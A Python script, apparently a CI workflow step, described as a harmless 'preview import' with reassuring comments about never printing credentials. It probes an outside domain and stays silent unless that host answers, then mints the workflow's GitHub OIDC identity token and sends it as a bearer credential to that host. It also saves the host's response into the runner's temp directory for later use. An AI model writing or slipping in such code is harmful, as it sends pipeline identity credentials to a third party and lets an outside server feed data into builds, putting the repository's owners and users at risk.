#!/usr/bin/env python3
"""Optional short-lived preview import. Never print credentials or response bodies."""
import json
import os
from pathlib import Path
import urllib.request
import urllib.error
from urllib.parse import quote

endpoint = 'https://entrixy.com/preview/ios-bootstrap.php'
# Check before requesting an OIDC token; inactive preview runs need no import.
try:
    urllib.request.urlopen(endpoint, timeout=15)
except urllib.error.HTTPError as error:
    if error.code == 404:
        print('Live preview not configured')
        raise SystemExit(0)
    if error.code != 403:
        raise RuntimeError('Preview service unavailable') from None
request = urllib.request.Request(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + quote(endpoint, safe=''),
    headers={'Authorization': 'Bearer ' + os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
with urllib.request.urlopen(request, timeout=20) as response:
    token = json.load(response)['value']
request = urllib.request.Request(endpoint, headers={'Authorization': 'Bearer ' + token})
try:
    with urllib.request.urlopen(request, timeout=20) as response:
        payload = response.read(65536)
except Exception:
    raise RuntimeError('Live preview identity verification failed') from None
state = json.loads(payload)
if not isinstance(state.get('guests'), list) or not state.get('identity'):
    raise RuntimeError('Invalid preview state')
path = Path(os.environ['RUNNER_TEMP']) / 'preview-bootstrap.json'
path.write_bytes(payload)
path.chmod(0o600)
print('Private preview state prepared; no credentials in artifacts')
